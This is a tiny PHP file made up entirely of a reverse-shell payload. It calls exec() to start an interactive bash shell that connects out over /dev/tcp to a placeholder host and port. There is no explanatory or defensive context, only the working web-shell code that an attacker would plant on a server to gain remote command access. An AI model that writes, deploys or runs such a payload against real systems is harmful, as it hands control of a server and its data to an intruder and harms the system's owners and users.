<?php
exec("bash -i >& /dev/tcp/<host>/<port> 0>&1");
?>